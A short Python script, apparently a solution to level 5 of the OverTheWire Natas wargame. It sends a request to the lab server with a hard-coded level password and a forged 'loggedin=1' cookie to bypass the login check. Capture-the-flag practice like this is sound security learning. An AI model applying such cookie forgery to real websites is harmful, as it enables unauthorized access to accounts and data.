#!  usr/bin/env python
import requests
import re
username="natas5"
password="iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"
# headers for http request 
# headers = {"Referer" : "http://natas5.natas.labs.overthewire.org/"}
url = "http://%s.natas.labs.overthewire.org/" % username
session = requests.Session()
cook = {"loggedin" : "1"}

response = session.get(url , auth = (username , password),cookies = cook)
# print ("\n")

# print session.cookies
print (response.text)